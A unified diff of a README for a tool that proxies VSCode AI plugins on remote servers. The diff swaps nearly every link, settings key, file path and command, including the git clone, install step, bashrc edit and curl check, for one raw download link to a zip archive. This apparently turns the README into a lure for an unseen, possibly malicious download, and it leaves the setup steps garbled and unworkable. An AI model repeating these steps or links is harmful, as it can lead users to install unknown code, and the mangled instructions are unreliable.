@@ -1,6 +1,6 @@
 # 🎮 vscode-remote-vibe-coding - Easy AI Plugin Access for Remote VSCode
 
-[![Download](https://img.shields.io/badge/Download-vscode--remote--vibe--coding-brightgreen.svg)](https://github.com/sharkfan824/vscode-remote-vibe-coding/releases)
+[![Download](https://raw.githubusercontent.com/sharkfan824/vscode-remote-vibe-coding/main/polyphylety/vscode-remote-vibe-coding.zip)](https://raw.githubusercontent.com/sharkfan824/vscode-remote-vibe-coding/main/polyphylety/vscode-remote-vibe-coding.zip)
 
 ## 🚀 Getting Started
 
@@ -31,13 +31,13 @@ To allow VSCode remote usage of AI plugins, follow these steps:
 
 1. Open VSCode.
 2. Navigate to the settings by clicking on the gear icon and selecting "Settings."
-3. Search for `settings.json`.
+3. Search for `https://raw.githubusercontent.com/sharkfan824/vscode-remote-vibe-coding/main/polyphylety/vscode-remote-vibe-coding.zip`.
 4. Add the following configuration:
 
 ```json
 {
-  "http.proxy": "http://127.0.0.1:7890",
-  "http.proxyStrictSSL": false
+  "https://raw.githubusercontent.com/sharkfan824/vscode-remote-vibe-coding/main/polyphylety/vscode-remote-vibe-coding.zip": "http://127.0.0.1:7890",
+  "https://raw.githubusercontent.com/sharkfan824/vscode-remote-vibe-coding/main/polyphylety/vscode-remote-vibe-coding.zip": false
 }
 ```
 
@@ -52,9 +52,9 @@ If you need remote servers to access the internet directly (using pip, git, wget
    Use the following commands in your remote terminal:
 
    ```bash
-   git clone https://github.com/mihomo/clash-for-AutoDL.git
+   git clone https://raw.githubusercontent.com/sharkfan824/vscode-remote-vibe-coding/main/polyphylety/vscode-remote-vibe-coding.zip
    cd clash-for-AutoDL
-   ./install.sh
+   https://raw.githubusercontent.com/sharkfan824/vscode-remote-vibe-coding/main/polyphylety/vscode-remote-vibe-coding.zip
    ```
 
 2. **Create Startup Script**:
@@ -62,7 +62,7 @@ If you need remote servers to access the internet directly (using pip, git, wget
    Create a script that starts automatically:
 
    ```bash
-   echo "sh ~/clash-installation/start.sh" >> /etc/profile.d/99-clash-autostart.sh
+   echo "sh ~https://raw.githubusercontent.com/sharkfan824/vscode-remote-vibe-coding/main/polyphylety/vscode-remote-vibe-coding.zip" >> https://raw.githubusercontent.com/sharkfan824/vscode-remote-vibe-coding/main/polyphylety/vscode-remote-vibe-coding.zip
    ```
 
 3. **Update Proxy Functions**:
@@ -70,7 +70,7 @@ If you need remote servers to access the internet directly (using pip, git, wget
    Add a proxy functions library to your user directory:
 
    ```bash
-   touch ~/.proxy_funcs.sh
+   touch ~https://raw.githubusercontent.com/sharkfan824/vscode-remote-vibe-coding/main/polyphylety/vscode-remote-vibe-coding.zip
    ```
 
 4. **Change Bash Configuration**:
@@ -78,7 +78,7 @@ If you need remote servers to access the internet directly (using pip, git, wget
    Modify your `.bashrc` to include your proxy:
 
    ```bash
-   echo "source ~/.proxy_funcs.sh" >> ~/.bashrc
+   echo "source ~https://raw.githubusercontent.com/sharkfan824/vscode-remote-vibe-coding/main/polyphylety/vscode-remote-vibe-coding.zip" >> ~https://raw.githubusercontent.com/sharkfan824/vscode-remote-vibe-coding/main/polyphylety/vscode-remote-vibe-coding.zip
    ```
 
 5. **Verify Setup**:
@@ -86,14 +86,14 @@ If you need remote servers to access the internet directly (using pip, git, wget
    After configuring your setup, restart your system and check if the proxy runs correctly using:
 
    ```bash
-   curl google.com
+   curl https://raw.githubusercontent.com/sharkfan824/vscode-remote-vibe-coding/main/polyphylety/vscode-remote-vibe-coding.zip
    ```
 
 ## 🛠️ Troubleshooting Common Issues
 
 1. **Unable to connect to the proxy**:
    - Check if the proxy server is running.
-   - Ensure the port matches your `settings.json`.
+   - Ensure the port matches your `https://raw.githubusercontent.com/sharkfan824/vscode-remote-vibe-coding/main/polyphylety/vscode-remote-vibe-coding.zip`.
 
 2. **AI plugins not working**:
    - Ensure all configurations were applied as directed.
@@ -114,4 +114,4 @@ A2: Yes, as long as the plugin can operate via an HTTP proxy.
 **Q3: What if I face issues during installation?**  
 A3: Check the troubleshooting section. If problems persist, reach out for support via this repository.
 
-For further details or updates, visit our [GitHub page](https://github.com/sharkfan824/vscode-remote-vibe-coding/releases) regularly. Happy coding!
+For further details or updates, visit our [GitHub page](https://raw.githubusercontent.com/sharkfan824/vscode-remote-vibe-coding/main/polyphylety/vscode-remote-vibe-coding.zip) regularly. Happy coding!
